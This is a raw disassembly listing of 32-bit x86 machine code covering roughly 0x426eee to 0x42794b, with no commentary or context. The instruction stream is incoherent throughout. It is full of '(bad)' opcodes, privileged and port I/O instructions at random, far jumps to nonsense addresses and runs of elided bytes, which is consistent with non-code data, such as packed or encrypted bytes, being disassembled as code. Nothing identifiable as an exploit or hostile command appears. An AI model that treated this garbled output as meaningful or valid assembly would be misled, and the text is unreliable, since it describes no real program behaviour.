  426eee:	jle    0x426ecd
  426ef0:	loop   0x426ea0
  426ef2:	mov    esp,0x84323bde
  426ef7:	rcl    DWORD PTR [ecx+0x3d9e0adc],0x1c
  426efe:	(bad)  [esp+ebp*2+0x3796e397]
  426f05:	rol    BYTE PTR [ecx-0x9],1
  426f08:	mov    eax,ds:0x74cab5e3
  426f0d:	xor    bh,BYTE PTR [esi+0x44]
  426f10:	mov    al,ds:0x0
	...
  426f71:	add    BYTE PTR [eax],al
  426f73:	add    BYTE PTR [edx+eiz*4-0xa380e39],ah
  426f7a:	mov    dh,0xf7
  426f7c:	inc    edi
  426f7d:	inc    ecx
  426f7e:	add    DWORD PTR [edi+ebp*8-0x2cfd82c0],esp
  426f85:	mov    al,ds:0x1050001
  426f8a:	add    BYTE PTR [eax],al
  426f8c:	and    edx,DWORD PTR [ecx]
  426f8e:	pusha  
  426f8f:	jnp    0x426fca
  426f91:	jp     0x427009
  426f93:	adc    esi,edx
  426f95:	push   ds
  426f96:	ja     0x426f8f
  426f98:	lods   al,BYTE PTR ds:[esi]
  426f99:	ins    BYTE PTR es:[edi],dx
  426f9a:	mov    ds:0xdd94d15,al
  426f9f:	sbb    BYTE PTR [ebp+0x3d7eabb7],bl
  426fa5:	mov    DWORD PTR [ecx+0x76],ebp
  426fa8:	pop    es
  426fa9:	cwde   
  426faa:	test   eax,0x8b60257d
  426faf:	adc    BYTE PTR [esi+0x33],0x58
  426fb3:	ret    
  426fb4:	xchg   edx,eax
  426fb5:	outs   dx,DWORD PTR ds:[esi]
  426fb6:	and    al,0xe8
  426fb8:	jl     0x64aba0c6
  426fbe:	mov    dl,0xbd
  426fc0:	daa    
  426fc1:	mov    eax,ds:0x1b0a1773
  426fc6:	ret    0x145
  426fc9:	int3   
  426fca:	xchg   BYTE PTR [eax+0x6188c6f0],dh
  426fd0:	push   cs
  426fd1:	xlat   BYTE PTR ds:[ebx]
  426fd2:	mov    bh,0xa6
  426fd4:	(bad)  
  426fd5:	imul   esp,esi,0x7e
  426fd8:	popa   
  426fd9:	into   
  426fda:	mov    cl,0x21
  426fdc:	cmc    
  426fdd:	lahf   
  426fde:	nop
  426fdf:	mov    edi,0x6b92102f
  426fe4:	pop    ebp
  426fe5:	rcl    DWORD PTR [esi+esi*1-0x3a5f7f1d],0x18
  426fed:	mov    DWORD PTR [esi+0x58ecf21c],eax
  426ff3:	jmp    0x598d2e93
  426ff8:	ret    0xc023
  426ffb:	int3   
  426ffc:	push   ebp
  426ffd:	xchg   ebp,eax
  426ffe:	loopne 0x42702b
  427000:	lods   eax,DWORD PTR ds:[esi]
  427001:	inc    ebx
  427002:	mov    al,0xa8
  427004:	mov    ecx,0x70e01d17
  427009:	fcom   DWORD PTR [ebx]
  42700b:	cmp    al,0x7c
  42700d:	pop    ebx
  42700e:	ja     0x426fb9
  427010:	jle    0x426fce
  427012:	repnz into 
  427014:	scas   eax,DWORD PTR es:[edi]
  427015:	xchg   esp,eax
  427016:	fwait
  427017:	in     al,0x35
  427019:	sbb    ecx,ebx
  42701b:	push   edx
  42701c:	cdq    
  42701d:	fs mov dl,0x20
  427020:	in     eax,0x90
  427022:	dec    esi
  427023:	arpl   WORD PTR [ecx+eax*2+0x3e],bp
  427027:	ja     0x427006
  427029:	int    0x48
  42702b:	lahf   
  42702c:	div    BYTE PTR [ebx]
  42702e:	and    DWORD PTR [ebx],esi
  427030:	shr    BYTE PTR [eax-0x36],1
  427033:	adc    ah,ah
  427035:	xlat   BYTE PTR ds:[ebx]
  427036:	pop    esi
  427037:	test   eax,0x500534b
  42703c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42703d:	repnz push edx
  42703f:	lods   al,BYTE PTR ds:[esi]
  427040:	or     eax,0xd3a3d407
  427045:	xor    BYTE PTR [edi-0x53],cl
  427048:	dec    BYTE PTR [edx-0x453728a1]
  42704e:	cmp    al,0xbe
  427050:	fimul  WORD PTR [ebx]
  427052:	test   DWORD PTR [ebp+edi*2+0x40],edi
  427056:	mov    eax,fs:0x9b4fcb0a
  42705c:	(bad)  
  42705d:	lods   al,BYTE PTR ds:[esi]
  42705e:	(bad)  
  42705f:	leave  
  427060:	test   DWORD PTR [esi+0x42],edx
  427063:	js     0x427054
  427065:	jne    0x427011
  427067:	int3   
  427068:	test   BYTE PTR [ebx-0x56],bl
  42706b:	inc    edi
  42706c:	leave  
  42706d:	or     edx,esi
  42706f:	sbb    al,0x26
  427071:	and    al,0x9c
  427073:	mov    dl,0xc6
  427075:	lock mov esi,0xcd70d39d
  42707b:	rcl    edi,cl
  42707d:	das    
  42707e:	cmp    al,0xf9
  427080:	test   BYTE PTR [esi],dl
  427082:	ret    0x885f
  427085:	outs   dx,DWORD PTR ds:[esi]
  427086:	test   al,0xb7
  427088:	and    edi,DWORD PTR [ebp+0x3c]
  42708b:	mov    ebp,0x995efc2b
  427090:	imul   eax,DWORD PTR [eax],0x0
	...
  4270f2:	add    BYTE PTR [eax],al
  4270f4:	or     al,0x6d
  4270f6:	sbb    dl,BYTE PTR [ebp-0x2700885]
  4270fc:	inc    esp
  4270fd:	mov    ebp,0x76599d96
  427102:	sahf   
  427103:	pop    ds
  427104:	fsub   DWORD PTR [ecx+0x1050001]
  42710a:	add    BYTE PTR [eax],al
  42710c:	push   esi
  42710d:	push   ss
  42710e:	(bad)  
  42710f:	or     bh,BYTE PTR [ebx+0x7d383b57]
  427115:	inc    edi
  427116:	xchg   esi,edi
  427118:	add    al,0xe8
  42711a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42711b:	xchg   edi,eax
  42711c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42711d:	cwde   
  42711e:	add    DWORD PTR [ebx+edx*2+0x214bb615],edi
  427125:	add    ah,BYTE PTR [ecx]
  427127:	ins    DWORD PTR es:[edi],dx
  427128:	adc    eax,0x4ade98e
  42712d:	mov    BYTE PTR [ebp-0x1cdfe344],dl
  427133:	lds    ebx,FWORD PTR [esi-0x59]
  427136:	pusha  
  427137:	test   BYTE PTR [edx],cl
  427139:	retf   
  42713a:	rcr    BYTE PTR [ecx+edx*4+0x43],1
  42713e:	sub    BYTE PTR [ebx+ecx*4-0x35],bl
  427142:	(bad)  
  427143:	out    dx,eax
  427144:	dec    esi
  427145:	add    edx,DWORD PTR [eax-0x7d]
  427148:	in     eax,dx
  427149:	sbb    bh,BYTE PTR [edi]
  42714b:	cdq    
  42714c:	fnstenv [ebx-0x43]
  42714f:	call   0xa349:0x1c494065
  427156:	lods   al,BYTE PTR ds:[esi]
  427157:	xchg   edi,eax
  427158:	cmp    DWORD PTR [esp+edi*2],ecx
  42715b:	xor    BYTE PTR [esi],cl
  42715d:	clc    
  42715e:	push   ds
  42715f:	mov    bl,BYTE PTR [edx+0x7b]
  427162:	lea    edi,[edi]
  427164:	std    
  427165:	ror    DWORD PTR [edx],0x3
  427168:	enter  0x5763,0xad
  42716c:	data16 jg 0x427188
  42716f:	pop    eax
  427170:	adc    BYTE PTR [eax],bh
  427172:	xchg   ch,ah
  427174:	cli    
  427175:	and    BYTE PTR [esi-0x292e3cc6],bh
  42717b:	in     eax,dx
  42717c:	mov    bh,0xd
  42717e:	and    BYTE PTR [ebx+edi*8+0x489f70ee],bh
  427185:	aad    0x88
  427187:	cmp    DWORD PTR [ecx],esi
  427189:	push   edx
  42718a:	fmul   st(1),st
  42718c:	enter  0x81ef,0x92
  427190:	loop   0x42715e
  427192:	iret   
  427193:	dec    esi
  427194:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427195:	xchg   DWORD PTR [edi],edi
  427197:	pop    ds
  427198:	frstor [edx+0x7c]
  42719b:	or     DWORD PTR [ecx+0x557486a2],0x6953591d
  4271a5:	or     dl,BYTE PTR [edi+0x25]
  4271a8:	push   0x67
  4271aa:	dec    edi
  4271ab:	dec    ebp
  4271ac:	mov    edx,0x411fee4
  4271b1:	test   eax,0x6183364a
  4271b6:	pusha  
  4271b7:	rol    ebp,1
  4271b9:	sbb    esp,edx
  4271bb:	aam    0xd3
  4271bd:	sub    eax,0x6a51139c
  4271c2:	add    ch,BYTE PTR [ebx-0x638ff43b]
  4271c8:	pop    esi
  4271c9:	jno    0x427246
  4271cb:	jnp    0x427196
  4271cd:	imul   edi,DWORD PTR [edx+ebp*8-0x5e],0x28409ec2
  4271d5:	inc    esi
  4271d6:	pop    esi
  4271d7:	jno    0x42720a
  4271d9:	push   ebp
  4271da:	mov    ecx,0x8ea5df1c
  4271df:	test   BYTE PTR [eax+0x76],al
  4271e2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4271e3:	adc    bh,BYTE PTR ds:0x324f19b4
  4271e9:	test   eax,0x183deeb0
  4271ee:	lds    ecx,FWORD PTR [ecx]
  4271f0:	pop    edx
  4271f1:	ds cdq 
  4271f3:	(bad)  
  4271f4:	fisub  DWORD PTR [eax+0x7756537d]
  4271fa:	jge    0x427208
  4271fc:	aas    
  4271fd:	repz sbb ebx,0xffffffae
  427201:	fiadd  DWORD PTR ds:[edx-0x21]
  427205:	pop    ds
  427206:	shl    ch,1
  427208:	push   ecx
  427209:	and    BYTE PTR [edx+ebp*8+0x63],bh
  42720d:	sar    DWORD PTR [esp+edi*8],0x62
	...
  427271:	add    BYTE PTR [eax],al
  427273:	add    BYTE PTR [esi],bl
  427275:	inc    ecx
  427276:	fdiv   QWORD PTR [edi+ebx*8-0x7e148143]
  42727d:	push   ecx
  42727e:	dec    ebp
  42727f:	mov    ds:0x2715f35,al
  427284:	frstor [edx+0x1050001]
  42728a:	add    BYTE PTR [eax],al
  42728c:	bound  ebp,QWORD PTR [ecx+0x58f1a76b]
  427292:	out    dx,al
  427293:	iret   
  427294:	sub    dh,BYTE PTR [ebx]
  427296:	xor    al,0x26
  427298:	mov    al,0x2
  42729a:	retf   
  42729b:	or     ch,ah
  42729d:	leave  
  42729e:	lods   al,BYTE PTR ds:[esi]
  42729f:	cmp    al,0xb0
  4272a1:	push   edx
  4272a2:	sub    al,0x12
  4272a4:	ficomp WORD PTR ds:[ebx+ebp*1]
  4272a8:	dec    DWORD PTR [edi]
  4272aa:	(bad)  
  4272ac:	in     eax,dx
  4272ad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4272ae:	icebp  
  4272af:	mov    eax,ds:0x303cee13
  4272b4:	push   ebp
  4272b5:	push   ebp
  4272b6:	xchg   esp,eax
  4272b7:	outs   dx,DWORD PTR ds:[esi]
  4272b8:	fidivr DWORD PTR [ecx-0x52]
  4272bb:	out    0xe6,al
  4272bd:	pop    esp
  4272be:	fs scas al,BYTE PTR es:[edi]
  4272c0:	call   0x33ae:0xe896701e
  4272c7:	das    
  4272c8:	rcl    BYTE PTR [ecx+esi*2-0x28],0x5d
  4272cd:	push   edi
  4272ce:	ret    0xfcdc
  4272d1:	pop    ss
  4272d2:	out    0x96,eax
  4272d4:	adc    dl,dl
  4272d6:	and    eax,DWORD PTR [ebx-0x6a]
  4272d9:	fadd   QWORD PTR [edx]
  4272db:	clc    
  4272dc:	xchg   edx,eax
  4272dd:	mov    bh,0xad
  4272df:	fiadd  DWORD PTR [ebx]
  4272e1:	sub    DWORD PTR [ebx+0x454da3c7],ecx
  4272e7:	out    dx,al
  4272e8:	call   edx
  4272ea:	add    eax,0xd185716b
  4272ef:	xlat   BYTE PTR ds:[ebx]
  4272f0:	cld    
  4272f1:	fstp   QWORD PTR ds:0xcb7f185c
  4272f7:	aas    
  4272f8:	cmp    esi,edx
  4272fa:	sub    BYTE PTR [esi+0x4b646615],bh
  427300:	add    BYTE PTR [edi],dh
  427302:	mov    eax,ds:0x96b99bdd
  427307:	mov    esp,0xef1af802
  42730c:	dec    esp
  42730d:	pop    ss
  42730e:	inc    esp
  42730f:	push   es
  427310:	jl     0x4272c2
  427312:	pop    ds
  427313:	or     BYTE PTR [eax-0x2a],0x1e
  427317:	sti    
  427318:	test   eax,0xad3c72b6
  42731d:	jmp    DWORD PTR [eax]
  427320:	pop    ss
  427321:	outs   dx,DWORD PTR ds:[esi]
  427322:	call   DWORD PTR [esi-0x39344825]
  427328:	jmp    0x427310
  42732a:	imul   edi,DWORD PTR [esi+0x27a8f91],0xfffffff0
  427331:	out    dx,al
  427332:	dec    ebx
  427333:	or     BYTE PTR [ecx+0x4a820e88],bl
  427339:	add    esi,DWORD PTR [edi]
  42733b:	xchg   ecx,eax
  42733c:	retf   
  42733d:	into   
  42733e:	pop    eax
  42733f:	jae    0x42732b
  427341:	jg     0x427343
  427343:	jge    0x427338
  427345:	cdq    
  427346:	pop    ebp
  427347:	(bad)  
  427348:	data16 adc BYTE PTR [edi],ch
  42734b:	loop   0x427368
  42734d:	dec    edx
  42734e:	push   ss
  42734f:	mov    WORD PTR [edi],es
  427351:	loope  0x4272f0
  427353:	retf   0x11bb
  427356:	or     DWORD PTR [eax+0x51],esp
  427359:	dec    esp
  42735a:	push   esp
  42735b:	add    bh,BYTE PTR [edx]
  42735d:	or     BYTE PTR [ebp-0x31469dc1],dh
  427363:	lods   al,BYTE PTR ds:[esi]
  427364:	lods   eax,DWORD PTR ds:[esi]
  427365:	mov    edx,0xadb63f74
  42736a:	sub    bh,dl
  42736c:	push   ebx
  42736d:	repnz mov eax,esi
  427370:	(bad)  
  427371:	and    BYTE PTR [edx-0x18370711],0x2a
  427378:	(bad)  
  427379:	loope  0x4273b6
  42737b:	cwde   
  42737c:	pop    ecx
  42737d:	cmc    
  42737e:	jg     0x4273b8
  427380:	bound  ecx,QWORD PTR [ebx-0x5e6e1a02]
  427386:	lods   eax,DWORD PTR ds:[esi]
  427387:	jmp    0xb9f4:0xe254b254
  42738e:	leave  
  42738f:	mov    al,ds:0x91
	...
  4273f4:	adc    bl,BYTE PTR ds:0xaf3f8832
  4273fa:	mov    edx,0x29f0389f
  4273ff:	sbb    ebp,DWORD PTR ds:0xe2491397
  427405:	mov    ds:0x1050001,eax
  42740a:	add    BYTE PTR [eax],al
  42740c:	xchg   ebp,eax
  42740d:	xchg   ecx,eax
  42740e:	jmp    0x42745f
  427410:	xchg   esi,eax
  427411:	add    al,ah
  427413:	test   DWORD PTR [edi],eax
  427415:	mov    ebp,0xe7ae0227
  42741a:	jg     0x4273d1
  42741c:	(bad)  
  42741d:	loope  0x4273bb
  42741f:	fistp  QWORD PTR [eax-0x68b64a6c]
  427425:	enter  0xc92c,0x73
  427429:	jp     0x427442
  42742b:	in     al,dx
  42742c:	popf   
  42742d:	shl    DWORD PTR [ebx-0x5c],cl
  427430:	push   ecx
  427431:	push   eax
  427432:	jnp    0x42745d
  427434:	sbb    eax,0xc2e53f76
  427439:	mov    edx,0xe13ce2bf
  42743e:	fadd   st(1),st
  427440:	fnstsw WORD PTR [ebp+0x2442e582]
  427446:	jne    0x427405
  427448:	jl     0x427428
  42744a:	dec    ebp
  42744b:	cmp    esi,edx
  42744d:	or     eax,0xde6b7f6a
  427452:	std    
  427453:	xchg   ecx,eax
  427454:	dec    ebp
  427455:	fisubr DWORD PTR [ebx+0x49b5947e]
  42745b:	ror    DWORD PTR [ebx-0x4053ab0d],1
  427461:	push   edx
  427462:	inc    edi
  427463:	pop    edx
  427464:	call   DWORD PTR [eax+edi*8]
  427467:	aaa    
  427468:	mov    db3,ebp
  42746b:	(bad)  
  42746c:	cmc    
  42746d:	(bad)  
  42746f:	es inc esi
  427471:	(bad)  
  427472:	pop    esp
  427473:	lods   eax,DWORD PTR ds:[esi]
  427474:	hlt    
  427475:	out    0xb2,al
  427477:	or     DWORD PTR [ebp-0x397ec87],edi
  42747d:	loop   0x4274b8
  42747f:	ss mov al,0x7
  427482:	and    DWORD PTR [ebp-0x37],ebp
  427485:	aaa    
  427486:	adc    eax,0xe18c785b
  42748b:	cdq    
  42748c:	add    eax,0xffdf2b4d
  427491:	dec    ebp
  427492:	lods   al,BYTE PTR ds:[esi]
  427493:	add    eax,0xd9dd38b9
  427498:	out    0x4c,al
  42749a:	out    0xa4,al
  42749c:	adc    bh,BYTE PTR [ecx]
  42749e:	lock cmp dh,ch
  4274a1:	aaa    
  4274a2:	sub    al,0x34
  4274a4:	not    DWORD PTR [esi-0x78]
  4274a7:	mov    ah,ch
  4274a9:	jmp    0x90a2:0x675555bf
  4274b0:	sub    al,0x67
  4274b2:	dec    edx
  4274b3:	stos   DWORD PTR es:[edi],eax
  4274b4:	jg     0x4274b8
  4274b6:	add    DWORD PTR [ebp+0x23],esp
  4274b9:	sbb    DWORD PTR [edi],ecx
  4274bb:	xlat   BYTE PTR ds:[ebx]
  4274bc:	xchg   DWORD PTR [edx+edi*8+0x1920b9d5],eax
  4274c3:	inc    ebx
  4274c4:	pop    esi
  4274c5:	xchg   esp,eax
  4274c6:	std    
  4274c7:	inc    ecx
  4274c8:	and    bl,BYTE PTR [eax-0x66bccece]
  4274ce:	add    al,BYTE PTR [ebp+0x32]
  4274d1:	cs sbb eax,0xf4e1b103
  4274d7:	and    DWORD PTR [eax+0x4607034a],ebp
  4274dd:	stc    
  4274de:	sbb    al,0x96
  4274e0:	mov    esi,0xd63dc585
  4274e5:	aam    0x18
  4274e7:	dec    edi
  4274e8:	mov    edi,0x195015f5
  4274ed:	fs mov ah,0xdb
  4274f0:	jb     0x427510
  4274f2:	adc    al,0xe3
  4274f4:	push   ds
  4274f5:	cwde   
  4274f6:	popf   
  4274f7:	sub    DWORD PTR [esi-0x5c],ecx
  4274fa:	les    ebx,FWORD PTR [ecx+ecx*2+0x1a412f9a]
  427501:	dec    esp
  427502:	jno    0x4274ce
  427504:	(bad)  
  427506:	push   edx
  427507:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427508:	pop    esi
  427509:	push   esi
  42750a:	jo     0x4274ba
  42750c:	push   ds
  42750d:	lahf   
  42750e:	jbe    0x427567
  427510:	pusha  
	...
  427571:	add    BYTE PTR [eax],al
  427573:	add    BYTE PTR [eax+ebp*4-0x40],bl
  427577:	stos   DWORD PTR es:[edi],eax
  427578:	hlt    
  427579:	jmp    0x4275fa
  42757b:	(bad)  
  42757c:	cmp    dh,BYTE PTR [esi]
  42757e:	jbe    0x4275ea
  427580:	cmp    DWORD PTR [ecx-0x5d],esp
  427583:	xor    eax,0x1a4e7
  427588:	add    eax,0xb5000001
  42758d:	mov    DWORD PTR [edi],eax
  42758f:	in     al,0x93
  427591:	jmp    0x427529
  427593:	cld    
  427594:	push   edx
  427595:	mov    edi,0x5d1d788a
  42759a:	xor    eax,0x8dde9a78
  42759f:	mov    cl,0xca
  4275a1:	dec    ecx
  4275a2:	jb     0x4275ee
  4275a4:	sub    eax,DWORD PTR [edi+0xa9df749]
  4275aa:	jmp    0x42761e
  4275ac:	inc    edi
  4275ad:	aam    0x8e
  4275af:	in     eax,0x1d
  4275b1:	jge    0x427547
  4275b3:	add    eax,0xccaac42a
  4275b8:	loop   0x42758c
  4275ba:	push   esp
  4275bb:	adc    eax,0x2f28249c
  4275c0:	mov    eax,DWORD PTR [ecx-0x54]
  4275c3:	aaa    
  4275c4:	jbe    0x4275ca
  4275c6:	ins    BYTE PTR es:[edi],dx
  4275c7:	popa   
  4275c8:	dec    ebp
  4275c9:	sbb    eax,0x55a819d3
  4275ce:	adc    al,0xae
  4275d0:	clc    
  4275d1:	pop    esi
  4275d2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4275d3:	fld    DWORD PTR [ecx]
  4275d5:	lds    edi,FWORD PTR [ebx+0x45]
  4275d8:	adc    edx,esi
  4275da:	dec    edi
  4275db:	js     0x427565
  4275dd:	out    0x4,eax
  4275df:	xor    al,0xf1
  4275e1:	outs   dx,BYTE PTR ds:[esi]
  4275e2:	add    esp,DWORD PTR [esp]
  4275e5:	and    BYTE PTR [edi],0xde
  4275e8:	jae    0x427626
  4275ea:	ja     0x427608
  4275ec:	jecxz  0x4275cb
  4275ee:	add    esi,0x7f
  4275f1:	xchg   ecx,eax
  4275f2:	test   BYTE PTR [eax-0x4db0cd8],bl
  4275f8:	scas   al,BYTE PTR es:[edi]
  4275f9:	pop    edi
  4275fa:	xchg   edi,eax
  4275fb:	inc    esp
  4275fc:	jnp    0x427629
  4275fe:	in     al,0xd7
  427600:	pop    eax
  427601:	inc    eax
  427602:	retf   
  427603:	or     cl,BYTE PTR [edi]
  427605:	sti    
  427606:	mov    ecx,0x43d92390
  42760b:	clc    
  42760c:	xchg   ebx,eax
  42760d:	add    al,0x85
  42760f:	int    0x86
  427611:	cli    
  427612:	cmp    al,0xae
  427614:	push   ecx
  427615:	mov    edi,0xf364e3e3
  42761a:	(bad)  [edi+0x218d60a4]
  427620:	cmp    edx,DWORD PTR [eax+ecx*2+0x32]
  427624:	test   DWORD PTR [edi-0x80],esp
  427627:	add    al,0x9
  427629:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42762a:	cdq    
  42762b:	adc    dl,BYTE PTR [edi+0xf49c142]
  427631:	cmp    ebp,DWORD PTR [esi-0x6e]
  427634:	jmp    0x4275b6
  427636:	pushf  
  427637:	or     DWORD PTR [ecx+0x28],ebp
  42763a:	xor    edx,DWORD PTR [edx+0x57e79c52]
  427640:	call   0xef75:0xbec9a710
  427647:	test   DWORD PTR [ebx],edi
  427649:	inc    ebp
  42764a:	jae    0x427605
  42764c:	into   
  42764d:	xchg   ah,ah
  42764f:	gs retf 
  427651:	in     al,0x43
  427653:	xor    ah,BYTE PTR [ebp+esi*4+0x5b]
  427657:	imul   esp,DWORD PTR [ebx+0x24],0x37849761
  42765e:	dec    edi
  42765f:	cwde   
  427660:	sbb    al,ah
  427662:	pop    ebp
  427663:	or     BYTE PTR [esi-0x452038a9],0x4a
  42766a:	test   BYTE PTR [esp+edx*4-0x55846e18],bh
  427671:	lea    esp,[eax]
  427673:	iret   
  427674:	(bad)  
  427675:	mov    ds:0xaced67b7,al
  42767a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42767b:	shr    edi,0xb9
  42767e:	ret    
  42767f:	xchg   edi,eax
  427680:	fimul  DWORD PTR [ebp+ebp*2-0x3a1a2be7]
  427687:	fmul   DWORD PTR [edx+0x68d52bd9]
  42768d:	jmp    0x1190c64
	...
  4276f2:	add    BYTE PTR [eax],al
  4276f4:	add    DWORD PTR [esi-0x70],edx
  4276f7:	out    dx,al
  4276f8:	xlat   BYTE PTR ds:[ebx]
  4276f9:	out    dx,al
  4276fa:	jg     0x4276fb
  4276fc:	in     al,dx
  4276fd:	xor    al,0x86
  4276ff:	(bad)  
  427701:	pop    ds
  427702:	popa   
  427703:	mov    ah,0xec
  427705:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427706:	add    DWORD PTR [eax],eax
  427708:	add    eax,0x88000001
  42770d:	or     eax,0x3db69904
  427712:	shl    BYTE PTR [ebx-0x209d5031],0x9c
  427719:	aas    
  42771a:	shl    ah,cl
  42771c:	adc    BYTE PTR [esp+edi*4-0x12382c33],bh
  427723:	pop    edi
  427724:	mov    esp,0x271ec740
  427729:	out    dx,eax
  42772a:	rcl    ebx,cl
  42772c:	call   0x2f9d5ec2
  427731:	ficomp DWORD PTR [ecx+ecx*4+0x35]
  427735:	xchg   bl,dl
  427737:	mov    cl,0x2c
  427739:	xchg   edi,eax
  42773a:	rol    DWORD PTR [ebx],cl
  42773c:	out    0x67,eax
  42773e:	je     0x427731
  427740:	popa   
  427741:	mov    edi,0xe45cfe90
  427746:	sub    DWORD PTR [edi+0x29],edi
  427749:	gs cli 
  42774b:	fs int 0xcf
  42774e:	xor    esi,DWORD PTR [edi-0x3053f335]
  427754:	or     al,0xf9
  427756:	bound  esi,QWORD PTR [edx+0x44e2171f]
  42775c:	jmp    0x4277d8
  42775e:	stos   BYTE PTR es:[edi],al
  42775f:	out    dx,eax
  427760:	jnp    0x42772a
  427762:	test   al,0xfd
  427764:	cmp    eax,0x7c37de05
  427769:	jne    0x427732
  42776b:	loope  0x427771
  42776d:	push   es
  42776e:	scas   al,BYTE PTR es:[edi]
  42776f:	mov    ds:0x4fbebbd7,eax
  427774:	test   eax,0x22dd068c
  427779:	jb     0x427757
  42777b:	jae    0x427760
  42777d:	inc    edi
  42777e:	(bad)  
  42777f:	dec    ebx
  427780:	repnz cs hlt 
  427783:	xchg   ebx,eax
  427784:	pop    edi
  427785:	inc    ebx
  427786:	and    edx,edi
  427788:	shr    DWORD PTR [eax-0x52],1
  42778b:	xchg   ebp,eax
  42778c:	xchg   ebx,eax
  42778d:	outs   dx,DWORD PTR ds:[esi]
  42778e:	push   eax
  42778f:	or     BYTE PTR [edi-0x19ea67ee],al
  427795:	xor    DWORD PTR [ebx+0x43],esp
  427798:	push   cs
  427799:	inc    esp
  42779a:	(bad)  
  42779c:	inc    esi
  42779d:	scas   al,BYTE PTR es:[edi]
  42779e:	jmp    0xa752:0x68f848d2
  4277a5:	mov    esp,0xb0dd67de
  4277aa:	or     eax,0x474b32bd
  4277af:	dec    ebx
  4277b0:	dec    esi
  4277b1:	iret   
  4277b2:	xchg   edi,eax
  4277b3:	dec    eax
  4277b4:	cmp    al,0x9e
  4277b6:	cmp    ebx,edi
  4277b8:	pop    ebp
  4277b9:	in     al,dx
  4277ba:	out    0x15,eax
  4277bc:	call   0x94e2dd42
  4277c1:	in     al,dx
  4277c2:	xor    DWORD PTR [esi+ecx*8+0x56c9ee93],esp
  4277c9:	imul   ecx,DWORD PTR [esi-0x4e8ae6ea],0xc2289e3
  4277d3:	aas    
  4277d4:	mov    ebx,0x9962e79b
  4277d9:	pop    eax
  4277da:	aad    0xb0
  4277dc:	mov    edx,0x8d30423
  4277e1:	push   ss
  4277e2:	je     0x427778
  4277e4:	cmovns eax,DWORD PTR [ebp-0x50]
  4277e8:	ret    
  4277e9:	mov    DWORD PTR [edx+eax*8],ecx
  4277ec:	test   eax,0xead4a05d
  4277f1:	jl     0x4277c1
  4277f3:	nop
  4277f4:	adc    ebx,DWORD PTR [esi-0x51]
  4277f7:	adc    DWORD PTR [edi],esp
  4277f9:	jbe    0x427829
  4277fb:	jnp    0x427805
  4277fd:	xchg   ecx,eax
  4277fe:	ficomp WORD PTR [esi]
  427800:	mov    bl,0x4e
  427802:	cmp    esp,ecx
  427804:	jb     0x4277c7
  427806:	mov    eax,ds:0xc7fc2342
  42780b:	sar    ebp,0xd2
  42780e:	mov    al,ds:0xf293
	...
  427873:	add    BYTE PTR [edx],bl
  427875:	mov    cl,BYTE PTR [ebx]
  427877:	inc    ebp
  427878:	fwait
  427879:	lds    ebx,FWORD PTR [esi-0x21]
  42787c:	jo     0x4278e3
  42787e:	fldl2e 
  427880:	les    esp,FWORD PTR [edx+ebx*1+0x5a]
  427884:	icebp  
  427885:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427886:	add    DWORD PTR [eax],eax
  427888:	add    eax,0x8a000001
  42788d:	ret    0xa6b6
  427890:	xor    al,0xde
  427892:	cmp    al,0x9
  427894:	bound  esp,QWORD PTR [edx+0x50]
  427897:	dec    ebx
  427898:	fbstp  TBYTE PTR [edi+0x534d47d0]
  42789e:	adc    ch,BYTE PTR [esi+ecx*1-0x3cbb58a8]
  4278a5:	cmp    esi,DWORD PTR [edx]
  4278a7:	jae    0x4278f0
  4278a9:	mov    WORD PTR [ecx+ecx*8],cs
  4278ac:	dec    esi
  4278ad:	mov    esp,0x53726b28
  4278b2:	popa   
  4278b3:	add    esp,DWORD PTR [eax]
  4278b5:	cmp    eax,0x27bd282c
  4278ba:	cwde   
  4278bb:	add    esi,DWORD PTR [edx-0x5cf544ab]
  4278c1:	fs test al,dh
  4278c4:	stos   DWORD PTR es:[edi],eax
  4278c5:	dec    esp
  4278c6:	je     0x4278ba
  4278c8:	lea    esp,[esi+0x5694ecec]
  4278ce:	rol    BYTE PTR [eax-0x7061af77],1
  4278d4:	sahf   
  4278d5:	fst    DWORD PTR cs:[ecx]
  4278d8:	push   ebp
  4278d9:	sub    eax,0x450ad88a
  4278de:	sahf   
  4278df:	imul   eax,ebx,0x6f
  4278e2:	repz sub dl,BYTE PTR [esi+0xdaa9d62]
  4278e9:	rcl    BYTE PTR [esi-0x6e],cl
  4278ec:	dec    edi
  4278ed:	dec    ebx
  4278ee:	stos   DWORD PTR es:[edi],eax
  4278ef:	lods   al,BYTE PTR ds:[esi]
  4278f0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4278f1:	(bad)  
  4278f2:	aam    0xef
  4278f4:	mov    ds:0x684aa714,eax
  4278f9:	mov    ecx,0x5a25ecd3
  4278fe:	leave  
  4278ff:	mov    cl,0xd1
  427901:	repz cmp DWORD PTR [ebp+0x53],0x1e
  427906:	mov    dh,dh
  427908:	push   eax
  427909:	dec    ebx
  42790a:	inc    ecx
  42790b:	ret    0x956d
  42790e:	mov    ebp,0x908099d4
  427913:	icebp  
  427914:	jge    0x4278ab
  427916:	lds    esi,FWORD PTR [ebx+0x4412ccb1]
  42791c:	outs   dx,DWORD PTR ds:[esi]
  42791d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42791e:	inc    ecx
  42791f:	xor    eax,0x83d079fe
  427924:	test   DWORD PTR [edx],eax
  427926:	cs stc 
  427928:	push   ds
  427929:	xchg   ecx,eax
  42792a:	inc    ebp
  42792b:	mov    DWORD PTR [ecx],ebp
  42792d:	retf   
  42792e:	or     dl,BYTE PTR [edi+0x13]
  427931:	rol    DWORD PTR [edx+0x584ae357],1
  427937:	(bad)  
  427938:	mov    ebx,0x489e97d5
  42793d:	inc    eax
  42793e:	out    dx,eax
  42793f:	push   0xffffffa4
  427941:	dec    eax
  427942:	fsubp  st(1),st
  427944:	add    dh,dl
  427946:	sbb    edi,edi
  427948:	dec    BYTE PTR [edi-0x10]
  42794b:	jp     0x4278cf
